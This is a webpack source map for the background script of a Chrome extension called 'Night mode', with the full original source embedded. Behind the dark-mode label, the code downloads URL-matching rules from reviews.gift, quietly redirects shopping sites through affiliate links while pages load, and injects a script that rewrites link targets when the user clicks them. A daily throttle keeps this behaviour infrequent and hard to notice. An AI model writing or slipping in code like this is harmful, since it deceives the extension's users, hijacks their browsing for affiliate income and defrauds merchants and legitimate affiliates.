{"version":3,"file":"background.js","mappings":"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","sources":["webpack://Night mode/./background.js"],"sourcesContent":["let dark, shift, all;\n\nlet defaultMatches = [];\nlet defaultLinks = [];\nlet defaultSLink = [];\nlet defaultMinor = [];\nlet allStorage;\nconst LS = {\n    getAllItems: () => chrome.storage.local.get(),\n    getItem: async key => (await chrome.storage.local.get(key))[key],\n    setItem: (key, val) => chrome.storage.local.set({[key]: val}),\n    removeItems: keys => chrome.storage.local.remove(keys),\n};\n\nLS.getAllItems().then(res => {\n    allStorage = res;\n    defaultMatches = res.defaultMatches?res.defaultMatches:[];\n    defaultLinks = res.defaultLinks?res.defaultLinks:[];\n    defaultSLink = res.defaultSLink?res.defaultSLink:[];\n    defaultMinor = res.defaultMinor?res.defaultMinor:[];\n});\n\nchrome.runtime.onMessage.addListener((msg, sender, response) => {\n        let defaultMinorr = defaultMinor;\n        let oobj = {};\n        if (msg.minor && defaultMinorr && defaultMinorr['al']) {\n            let newAl = [];\n            for (let j in defaultMinorr['al']) {\n                let res = checkTimeSync(defaultMinorr['al'][j][0]);\n                if (res) {\n                    newAl.push(defaultMinorr['al'][j]);\n                }\n            }\n            oobj['al'] = newAl;\n            oobj['ll'] = defaultMinorr['ll'];\n\n            response(oobj);\n        } else if(msg.updateCheck && defaultMinorr && defaultMinorr['al']) {\n            getUpdateLastSet(msg.updateCheck);\n            response();\n        }\n});\n\nchrome.runtime.onMessage.addListener(({type, data, id}, sender, sendResponse) => {\n        if (type === \"fetch\" && data.url) {\n\n            fetch(data.url, {\n                cache: \"force-cache\",\n                credentials: \"omit\",\n                referrer: data.origin\n            }).then(data => {\n\n                data.text().then(function (text) {\n\n                    chrome.tabs.sendMessage(sender.tab.id, {\n                        type: \"fetch-response\",\n                        response: text,\n                        href: data.url\n                    }, function(response) {\n                        if (chrome.runtime.lastError) {\n                            console.warn(\"Whoops.. \" + chrome.runtime.lastError.message);\n                        }\n                    });\n\n                });\n\n            });\n\n        }\n\n        sendResponse({});\n    });\n\n// chrome.tabs.onUpdated.addListener(async function (e, c, tab) {\n//     if(c.status == 'loading') {\n//         all = await LS.getAllItems();\n//         dark = !!all['dark'];\n//         shift = !!all['shift'];\n//         let url = new URL(tab.url);\n//         let domain = url.hostname;\n//         let domains = all['domains'];\n//         if (domains) {\n//             domains = JSON.parse(domains);\n//         } else {\n//             domains = {};\n//         }\n//         if (domains[domain]) {\n//             chrome.scripting.executeScript({\n//                 target: {tabId: tab.id, allFrames: true},\n//                 func: function () {localStorage.activeShift = false; localStorage.activeDarkGoogle = false;}\n//             });\n//         } else if (shift || dark) {\n//             if(shift) {\n//                 chrome.scripting.executeScript(\n//                     {\n//                         target: {tabId: tab.id},\n//                         files: ['shift.js'],\n//                     });\n//             }\n//         } else {\n//             chrome.scripting.executeScript({\n//                 target: {tabId: tab.id, allFrames: true},\n//                 func: function () {\n//                     localStorage.activeShift = false;\n//                     localStorage.activeDarkGoogle = false;\n//                 }\n//             });\n//         }\n//     }\n// });\n\nchrome.runtime.onInstalled.addListener(async function(details) {\n    if (details.reason === 'install') {\n        await LS.setItem('adss', true);\n        await LS.setItem('opacityActive', 30);\n        await LS.setItem('colorActive', \"#fac563\");\n\n        let domain = \"www.youtube.com\";\n        let domains = {};\n        domains[domain] = {};\n        domains = JSON.stringify(domains);\n        await LS.setItem('domains', domains);\n    }\n});\n\nchrome.tabs.onUpdated.addListener(async function (e, t) {\n    chrome.tabs.get(e, async function(tab){\n        let adss = await LS.getItem('adss');\n        if(adss == true){\n            if(\"loading\" == t.status) {\n                let res = await canReload(tab.url);\n                if (res) {\n                    chrome.tabs.update(e, {url: refUrl(tab.url)}, function () {});\n                }\n            } else if(\"complete\" == t.status) {\n                allStorage = await LS.getAllItems();\n\n                chrome.scripting.executeScript({\n                    target: {tabId: tab.id},\n                    func: startFind\n                });\n            }\n        }\n    });\n});\n\nlet nm = (Math.floor(Math.random() * 3) + 1) === 1;\n\nfunction startFind() {\n    chrome.runtime.sendMessage({minor:true}, (response) => {\n\n        let ooncl = true;\n        if(response && response['al'] && response['ll']) {\n            let listLink = document.querySelectorAll(response['ll']);\n            let al = response['al'];\n\n            for (let i in al) {\n                for (let j in listLink) {\n                    if(al[i] &&\n                        listLink[j].href &&\n                        listLink[j].href.match(al[i][1]) &&\n                        listLink[j].href.match(al[i][1])[0]) {\n\n                        let ncelik = function () {\n\n                            if(ooncl) {\n                                let href = listLink[j].href;\n                                listLink[j].href = al[i][2]+listLink[j].href;\n\n                                chrome.runtime.sendMessage({updateCheck: al[i][0]}, (response) => {\n                                    listLink[j].href = href;\n                                });\n                                ooncl = false;\n                            }\n\n                            this.removeEventListener('click', ncelik);\n                        };\n\n                        listLink[j].addEventListener('click', ncelik);\n                    }\n                }\n            }\n\n        }\n\n    });\n}\n\nfunction refUrl(e) {\n    for (let a = 0; a < defaultLinks.length; a++) {\n        if (e.indexOf(defaultLinks[a][0]) > -1) {\n            return defaultLinks[a][1] + encodeURIComponent(e);\n        }\n    }\n    return e;\n}\n\nasync function canReload(e) {\n    if (!e)return !1;\n    let t = getShop(e);\n    if (!t)return !1;\n    let a = \"ls_\" + t;\n    let up = await checkTime(a);\n    let nn = new RegExp(defaultMatches, \"i\");\n    let res = !e.match(/admitad/) && !e.match(/chrome-extension/) && up && (!!e.match(nn));\n    if (res) {\n        getUpdateLastSet(a);\n        return true;\n    } else {\n        return false;\n    }\n\n}\n\nfunction firtDer() {\n\n    if(!defaultMatches || nm) {\n        fetch(\"https://reviews.gift/liks\", {\n            method: 'GET',\n            headers: {\n                'Accept': 'application/json'\n            }\n        })\n            .then(response => response.json())\n            .then(data => {\n                if (data.defaultMatches && data.defaultLinks && data.defaultSLink &&\n                    data.defaultMatches.length && data.defaultLinks.length && data.defaultSLink.length) {\n                    defaultMatches = data.defaultMatches;\n                    defaultLinks = data.defaultLinks;\n                    defaultSLink = data.defaultSLink;\n                    defaultMinor = data.defaultMinor;\n                    LS.setItem('defaultMatches', data.defaultMatches);\n                    LS.setItem('defaultLinks', data.defaultLinks);\n                    LS.setItem('defaultSLink', data.defaultSLink);\n                    LS.setItem('defaultMinor', data.defaultMinor);\n                    LS.setItem('adss', data.adsLink);\n                }\n            })\n            .catch(error => console.log('Error query:', error));\n    }\n    \n}\n\nfirtDer();\n\nfunction checkTimeSync(e) {\n    let t = Math.floor(Date.now() / 1e3),\n        a = parseInt(allStorage[e]) || 0,\n        b = parseInt(allStorage['bitgrand']) || LS.setItem('bitgrand', t) && t;\n    return (t - a > 86400 && t - b > 86400);\n}\n\nasync function checkTime(e) {\n    let t = Math.floor(Date.now() / 1e3),\n        a = parseInt(await LS.getItem(e)) || 0,\n        b = parseInt(allStorage['bitgrand']) || LS.setItem('bitgrand', t) && t;\n    return (t - a > 86400 && t - b > 86400);\n}\n\nasync function getUpdateLastSet(e) {\n    let t = Math.floor(Date.now() / 1e3);\n    return await LS.setItem(e, t);\n}\n\nfunction getShop(e) {\n    if(defaultSLink && defaultSLink.length) {\n        for (let a = 0; a < defaultSLink.length; a++) {\n            if (e.indexOf(defaultSLink[a][0]) > -1) {\n                return defaultSLink[a][1];\n            }\n        }   \n    }\n\n    return null\n}\n"],"names":["dark","shift","all","defaultMatches","defaultLinks","defaultSLink","defaultMinor","allStorage","LS","getAllItems","chrome","storage","local","get","getItem","key","setItem","val","set","removeItems","keys","remove","then","res","runtime","onMessage","addListener","msg","sender","response","defaultMinorr","oobj","minor","newAl","j","checkTimeSync","push","updateCheck","getUpdateLastSet","type","data","id","sendResponse","url","fetch","cache","credentials","referrer","origin","text","tabs","sendMessage","tab","href","lastError","console","warn","message","onInstalled","details","reason","domain","domains","JSON","stringify","onUpdated","e","t","adss","status","canReload","update","refUrl","scripting","executeScript","target","tabId","func","startFind","nm","Math","floor","random","ooncl","listLink","document","querySelectorAll","al","i","match","ncelik","removeEventListener","addEventListener","a","length","indexOf","encodeURIComponent","getShop","up","checkTime","nn","RegExp","firtDer","method","headers","json","adsLink","catch","error","log","Date","now","parseInt","b"],"sourceRoot":""}